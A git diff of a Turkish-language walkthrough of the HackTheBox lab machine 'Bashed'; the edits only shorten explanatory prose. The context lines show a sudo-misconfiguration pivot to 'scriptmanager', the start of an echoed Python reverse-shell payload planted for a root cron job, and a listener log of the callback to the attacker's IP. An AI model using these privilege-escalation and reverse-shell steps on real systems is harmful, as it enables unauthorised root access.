@@ -81,7 +81,7 @@ User www-data may run the following commands on bashed:
 <img width="744" height="542" alt="sudol" src="https://github.com/user-attachments/assets/43414f60-73f4-4b31-b0aa-1fcffd425842" />
 
 
-`www-data`, şifre girmeden `scriptmanager` kimliğiyle **herhangi bir komutu** çalıştırabiliyoruz — kural muhtemelen tek bir script'e izin vermek için yazılmış, `ALL` ile kapsam tamamen genişletilmiş. Klasik bir sudo misconfiguration ile karşı karşıyayız.
+`www-data`, şifre girmeden `scriptmanager` kimliğiyle **herhangi bir komutu** çalıştırabiliyoruz. Klasik bir sudo misconfiguration ile karşı karşıyayız.
 
 ```bash
 sudo -u scriptmanager /bin/bash
@@ -96,7 +96,7 @@ $ ls -ld /scripts
 drwxrwxr-- 2 scriptmanager scriptmanager 4096 Jun  2  2022 /scripts
 ```
 
-`www-data` iken bu dizine erişimimiz `Permission denied` ile reddediliyordu; izinler sadece `scriptmanager` sahipliği/grubuna yazma-okuma hakkı tanıyor. `sudo -l` çıktısındaki `NOPASSWD: ALL` bize doğrudan crontab erişimi vermiyor — root'un crontab'ını göremiyoruz. Ama isim seçimi (`scriptmanager` + `/scripts`) tek başına güçlü bir sinyal veriyor: bu paternde neredeyse her zaman root'a ait bir cron job, bu dizini periyodik tarayıp içindeki dosyaları kendi yetkisiyle çalıştırır. Crontab'a doğrudan erişimimiz yoksa bunu genelde `pspy` ile (root yetkisi gerektirmeden çalışan process'leri gözlemleyen bir araç) doğrularız; Bashed'de senaryo tam olarak bu — `/scripts` altındaki `.py` dosyaları root cron job'u tarafından düzenli aralıklarla execute ediliyor.
+`www-data` iken bu dizine erişimimiz `Permission denied` ile reddediliyordu; izinler sadece `scriptmanager` sahipliği/grubuna yazma-okuma hakkı tanıyor. `sudo -l` çıktısındaki `NOPASSWD: ALL` bize doğrudan crontab erişimi vermiyor — root'un crontab'ını göremiyoruz. Ama isim seçimi (`scriptmanager` + `/scripts`) tek başına güçlü bir sinyal veriyor: bu paternde neredeyse her zaman root'a ait bir cron job, bu dizini periyodik tarayıp içindeki dosyaları kendi yetkisiyle çalıştırır. Crontab'a doğrudan erişimimiz yoksa bunu genelde `pspy` ile doğrularız; Bashed'de senaryo tam olarak bu — `/scripts` altındaki `.py` dosyaları root cron job'u tarafından düzenli aralıklarla execute ediliyor.
 
 Zinciri şöyle kuruyoruz:
 
@@ -119,7 +119,7 @@ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STR
 
 <img width="890" height="182" alt="sudol2" src="https://github.com/user-attachments/assets/8d2fa31e-a501-4873-9697-47608b1e38a6" />
 
-Cron'un bir sonraki tetiklenmesini bekliyoruz (tipik olarak ≤1 dakika):
+Cron'un bir sonraki tetiklenmesini bekliyoruz:
 
 ```
 connect to [10.10.14.187] from (UNKNOWN) [10.129.51.18] 35430
